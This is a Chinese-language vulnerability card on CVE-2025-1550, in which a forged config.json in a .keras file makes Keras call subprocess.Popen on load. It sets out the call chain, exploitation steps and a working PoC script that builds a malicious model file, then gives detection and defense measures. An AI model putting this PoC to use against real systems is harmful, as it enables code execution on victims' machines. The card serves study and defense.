---
id: ai-security-supply-chain-keras-config-dynamic-class-rce
title: Keras 加载 .keras 时按 config 动态导入任意模块的类/函数：伪造 config.json 调用 subprocess.Popen 实现 RCE（CVE-2025-1550）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: model-config-deserialization-rce
aliases:
- CVE-2025-1550
- Keras 模型反序列化 RCE
- .keras config.json 注入
- deserialize_keras_object RCE
- Keras load_model 任意代码执行
tags:
- keras
- tensorflow
- model-supply-chain
- deserialization
- rce
- python
- mlops
cve:
- CVE-2025-1550
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T12:09:30+08:00'
  notes: 已对照原文核对：img01 diff 新版加包名白名单、img02-03 load_model->_load_model_from_fileobj->_model_from_config->deserialize_keras_object、img05 FunctionType 直通与 from_config(inner_config)、img10 process_node 中 layer(*args,**kwargs) 危险调用、img11 process_layer 嵌套 deserialize_keras_object、img12 class_name==function 分支，12 图均与卡内原理一致；卡内 PoC 与原文脚本逐字一致。CVE-2025-1550 为原文标题明示；affected_versions 留空正确（原文仅说新版本加了限制，无明确区间）。dedup 判 rasa/vllm/pytorch 等候选均 new，dedup_review 理由成立；dup-scan 无涉及 pair。未验证点：PoC 为本地脚本未实测执行（calc 为 Windows 弹窗），无实际回显证据。
---

## 一句话结论

Keras 在解析 `.keras` 包内 `config.json` 时，`deserialize_keras_object` 会用 config 里的 `module` 与 `class_name` 去 `importlib.import_module()` 并取属性，且当 `class_name == "function"` 时直接返回该函数对象；把 `module` 写成 `subprocess`、`class_name` 写成 `function`、内层 `config` 写成 `Popen`，再通过 `Model.from_config → functional_from_config → process_node` 把完全可控的 `args`/`kwargs` 调用上去，加载模型文件即执行任意命令。

## 原理

调用链（`keras.models.load_model`）：

```
load_model → saving_lib.load_model → _load_model_from_fileobj
  → _model_from_config → deserialize_keras_object
    → _retrieve_class_or_fn(name, registered_name, module, ...)
```

`_retrieve_class_or_fn` 的核心逻辑是：

```python
package = module.split(".")[0]
if package in {"keras", "keras_hub", "keras_cv", "keras_nlp"}:   # 修复后新增的白名单
    mod = importlib.import_module(module)
    obj = vars(mod).get(name, None)
```

修复前的版本没有这个包名前缀白名单，任何可导入模块都会被导入，并把其中的属性取出来返回。这本身只是“任意属性读取”，要变成 RCE 还差一次“以可控参数调用”。Keras 正好提供了三处自动调用：

1. `cls.from_config(inner_config)`（`class_name` 为类时）；
2. `layer(*args, **kwargs)`（图重建时调用层对象）；
3. `get(...)` 一类固定方法。

利用走第 1、2 条的组合：

- 第一层：`class_name = "Model"`、`module = "keras.models"`。`Model.from_config` 判断 config 里同时含 `layers`/`input_layers`/`output_layers` 后转给 `functional_from_config(cls, config, custom_objects)`。
- 第二层：`functional_from_config` 先 `functional_config[key] = config.pop(key)` 取出 `layers`，逐个 `process_layer(layer_data)`；`process_layer` 对每个 layer dict 调用 `serialization_lib.deserialize_keras_object(layer_data, ...)`。
- 第三层：该 layer dict 里 `class_name = "function"`，`deserialize_keras_object` 进入专门分支：

```python
if class_name == "function":
    fn_name = inner_config
    return _retrieve_class_or_fn(fn_name, registered_name, module, obj_type="function", ...)
```

此时 `inner_config` 就是 `config` 字段（`"Popen"`），`module` 是 `"subprocess"`，于是返回未绑定的 `subprocess.Popen` 函数对象。函数对象没有 `from_config`，但 `deserialize_keras_object` 对 `types.FunctionType` 直接 `return cls`，绕过 `from_config` 检查。

- 第四层：`functional_from_config` 把该 layer 登记进 `created_layers`，随后 `process_node(layer, node_data)` 解析 `inbound_nodes` 得到 `args, kwargs = deserialize_node(...)`，最后执行 `layer(*args, **kwargs)`——即 `subprocess.Popen(["calc"], bufsize=-1)`。

因此漏洞成立的三个必要条件：任意模块导入（无白名单）、`function` 类型直通返回（绕过 `from_config`）、图重建时对返回对象做无条件调用（把“取到危险函数”变成“执行危险函数”）。

## 触发条件

- 目标使用受影响版本的 Keras（3.x，`safe_mode` 默认开启也无法阻断，因为该路径是模型结构重建的正常流程）；
- 应用会加载不可信来源的 `.keras` 文件：模型市场/网盘下载、用户上传、CI 拉取第三方模型、插件自动加载目录；
- 攻击者可控制包内 `config.json`（`.keras` 是 zip，直接改写其中一个条目即可，不需要重新训练）。

## 利用步骤

1. 训练或下载一个正常 `.keras` 模型，确认结构可被目标 Keras 版本加载；
2. 用 zipfile 重写包：剔除原 `config.json`，写入恶意 config（结构见 PoC）；
3. 把文件交给受害者加载（`keras.models.load_model("model.keras")`、`keras.saving.load_model`、Web 端“上传模型”功能）；
4. 触发时第一层 `Model.from_config` 进入 functional 分支，第三层 `function` 返回 `subprocess.Popen`，`process_node` 调用它启动命令；
5. 若报缺少字段，按报错补齐 `input_layers`/`output_layers`/`inbound_nodes` 中的 `args`/`kwargs` 结构即可（原文提示：缺字段手动添加）。

## PoC

最小 config（`keras.utils.deserialize_keras_object(config)` 即可验证，无需真实模型）：

```python
import keras

config = {
  "config": {
    "module": "keras.models",
    "class_name": "Model",
    "config": {
      "name": "le0n",
      "layers": [
        {
          "name": "le0n",
          "class_name": "function",
          "config": "Popen",
          "module": "subprocess",
          "inbound_nodes": [
            {"args": [["calc"]], "kwargs": {"bufsize": -1}}
          ]
        }
      ],
      "input_layers": [["le0n", 0, 0]],
      "output_layers": [["le0n", 0, 0]]
    }
  }
}
keras.utils.deserialize_keras_object(config)
```

生成恶意 `.keras` 文件（替换 zip 内的 config.json）：

```python
import os, json, zipfile
import numpy as np
from keras.models import Sequential
from keras.layers import Dense

model = Sequential([Dense(1, activation="linear", input_dim=28 * 28)])
model.compile(optimizer="adam", loss="mse")
model.fit(np.random.rand(100, 784), np.random.rand(100), epochs=1)
model.save("model.keras")

malicious_config = {...}  # 同上

with zipfile.ZipFile("model.keras") as zin, zipfile.ZipFile("tmp.keras", "w") as zout:
    for item in zin.infolist():
        if item.filename != "config.json":
            zout.writestr(item, zin.read(item.filename))
os.remove("model.keras"); os.rename("tmp.keras", "model.keras")
with zipfile.ZipFile("model.keras", "a") as z:
    z.writestr("config.json", json.dumps(malicious_config))

keras.models.load_model("model.keras")   # 触发
```

Windows 弹计算器用 `["calc"]`；Linux 可换成 `["/bin/sh", "-c", "id > /tmp/p"]`，或把 `kwargs` 里的 `shell` 设为 `True`。

## 变体与关联

- 函数变体：`class_name: "function"` 可指向任意模块属性，如 `os.system`、`os.popen`、`builtins.eval`/`exec`、`subprocess.run`/`check_output`，参数形式随目标函数调整；
- 类变体：把 `class_name` 改成有权重构造副作用的类（如某些 loader/wrapper），走 `from_config` 分支，同样在解析期执行副作用；
- 载体变体：`.h5`/SavedModel 走 legacy 分支同样会调用反序列化，但 `.keras` 的 config 完全由 JSON 决定，构造最简单；
- 关联：HuggingFace pickle 模型、joblib/numpy 反序列化、torch.load、GGUF chat template SSTI 属于同类“模型文件即代码”问题；防御思路一致——不加载不可信模型，或在隔离环境加载；
- 关联：`safe_mode=True` 只限制 Lambda 层等少数对象，对本链无效，不能当作缓解措施。

## 检测与防御

- 升级 Keras 到修复版本：`_retrieve_class_or_fn` 增加了包名前缀白名单（仅允许 `keras`、`keras_hub`、`keras_cv`、`keras_nlp`），非白名单模块直接 `TypeError`；
- 加载前校验：把 `.keras` 当 zip 打开，检查 `config.json` 中所有 `module` 字段是否在允许列表内、`class_name` 是否为 `function`，命中即拒绝；
- 供应链：模型文件做哈希与签名，来源白名单；CI 中禁止 `load_model` 直接加载外部工件；
- 运行隔离：模型加载与推理放到无网络、无敏感挂载的容器/沙箱中，限制可执行文件与出网；
- 检测：监控进程树中“Python/训练进程 → subprocess/sh”的异常子进程，以及模型加载时出现的 `import` 非 Keras 包、`/tmp` 下新增可执行文件等行为。
